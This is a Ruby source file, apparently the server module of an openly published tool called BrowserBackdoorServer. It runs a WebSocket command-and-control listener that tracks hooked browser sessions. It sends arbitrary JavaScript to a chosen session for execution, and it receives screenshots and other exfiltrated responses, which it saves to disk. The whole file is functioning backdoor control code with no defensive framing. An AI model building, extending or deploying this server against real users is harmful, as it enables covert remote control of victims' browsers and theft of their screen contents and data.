#
# Copyright (c) 2016 IMcPwn  - http://imcpwn.com
# BrowserBackdoorServer by IMcPwn.
# See the file 'LICENSE' for copying permission
#

require_relative 'printcolor'
require 'em-websocket'
require 'base64'

module Bbs

class WebSocket
    @@wsList = Array.new
    @@selected = -1
    def setSelected(newSelected)
        @@selected = newSelected
    end
    def getSelected()
        return @@selected
    end
    def getWsList()
        return @@wsList
    end
    def setWsList(newWsList)
        @@wsList = newWsList
    end
    def startEM(log, host, port, secure, priv_key, cert_chain, response_limit)
        EM.run {
            EM::WebSocket.run({
                :host => host,
                :port => port,
                :secure => secure,
                :tls_options => {
                    :private_key_file => priv_key,
                    :cert_chain_file => cert_chain
            }
            }) do |ws|
                log.info("Listening on host #{host}:#{port}")
                ws.onopen { |_handshake|
                    open_message = "WebSocket connection open: #{ws}"
                    Bbs::PrintColor.print_notice(open_message)
                    log.info(open_message)
                    @@wsList.push(ws)
                }
                ws.onclose {
                    close_message = "WebSocket connection closed: #{ws}"
                    Bbs::PrintColor.print_error(close_message)
                    log.info(close_message)
                    @@wsList.delete(ws)
                    # Reset selected error so the wrong session is not used.
                    @@selected = -2
                }
                ws.onmessage { |msg|
                    Bbs::WebSocket.detectResult(msg, ws, log, response_limit)
                }
                ws.onerror { |e|
                    error_message = "Error with WebSocket connection #{ws}: #{e.message}"
                    Bbs::PrintColor.print_error(error_message)
                    log.error(error_message)
                    @@wsList.delete(ws)
                    # Reset selected variable after error.
                    @@selected = -2
                }
            end
        }
    end

    def self.detectResult(msg, ws, log, response_limit)
        if msg.start_with?("Screenshot data URL: data:image/png;base64,")
            Bbs::WebSocket.writeScreenshot(msg, ws, log)
        elsif msg.length > response_limit
            Bbs::WebSocket.writeResult(msg, ws, log)
        # TODO: Detect other result types
        else
            Bbs::PrintColor.print_notice("Response received: #{msg}")
            log.info("Response received from #{ws}: #{msg}")
        end
    end

    def self.writeScreenshot(msg, ws, log)
        begin
            encodedImage = msg.gsub(/Screenshot data URL: data:image\/png;base64,/, "")
            if encodedImage == "" then raise "Screenshot is empty" end
            image = Base64.strict_decode64(encodedImage)
            file = File.open("./bb-result-#{Time.now.to_f}.png", "w")
            file.write(image)
            Bbs::PrintColor.print_notice("Screenshot received (size #{msg.length} characters). Saved to #{file.path}")
            log.info("Screenshot received (size #{msg.length}) from #{ws}. Saved to #{file.path}")
            file.close
        rescue => e
            Bbs::PrintColor.print_error("Error converting incoming screenshot to PNG automatically (#{e.message}). Attempting to save as .txt")
            log.error("Screenshot received (size #{msg.length}) from #{ws} but could not conver to PNG automatically with error: #{e.message}")
            Bbs::WebSocket.writeResult(msg, ws, log)
        end
    end

    def self.writeResult(msg, ws, log)
        begin
            file = File.open("./bb-result-#{Time.now.to_f}.txt", "w")
            file.write(msg)
            Bbs::PrintColor.print_notice("Response received but is too large to display (#{msg.length} characters). Saved to #{file.path}")
            log.info("Large response received (size #{msg.length}) from #{ws}. Saved to #{file.path}")
            file.close
        rescue => e
            Bbs::PrintColor.print_error("Error saving response to file: " + e.message)
            Bbs::PrintColor.print_notice("Large response received (#{msg.length} characters) but could not save to file, displaying anyway: " + msg)
            log.error("Too large response recieved (size #{msg.length}) from #{ws} but could not save to file with error: #{e.message}")
        end
    end
    
    def self.sendCommand(cmd, ws)
        command = ""\
            "setTimeout((function() {"\
            "try {"\
            "#{cmd}"\
            "}"\
            "catch(err) {"\
            "ws.send(err.message);"\
            "}"\
            "}"\
            "), 0);"
        ws.send(command)
    end

    def self.validSession?(selected, wsList)
        if selected == -2
            Bbs::PrintColor.print_error("That session has been closed.")
            return false
        elsif selected < -1
            Bbs::PrintColor.print_error("Valid sessions will never be less than -1.")
            return false
        elsif wsList.length <= selected
            Bbs::PrintColor.print_error("Session does not exist.")
            return false
        elsif wsList.length < 1
            Bbs::PrintColor.print_error("No sessions are open.")
            return false
        end
        return true
    end

end

end

